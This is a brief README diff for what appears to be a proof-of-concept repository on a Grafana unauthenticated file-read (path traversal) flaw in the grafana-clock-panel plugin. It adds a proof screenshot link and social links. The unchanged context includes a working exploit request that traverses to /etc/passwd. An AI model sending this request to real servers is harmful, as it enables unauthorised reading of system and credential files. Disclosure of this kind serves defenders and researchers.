@@ -6,6 +6,9 @@ It looks like the new 0day LFI in Grafana exists thanks to the grafana-clock-pan
 
 ```GET /public/plugins/grafana-clock-panel/../../../../../../../etc/passwd```
 
+### Proof
+![PoC](https://raw.githubusercontent.com/Vulnmachines/grafana-unauth-file-read/main/Grafana.PNG)
+
 ### Follow us
 ### [Youtube](https://www.youtube.com/c/rapidsafeguard)
 ### [Twitter](https://www.twiiter.com/rapidsafeguard)
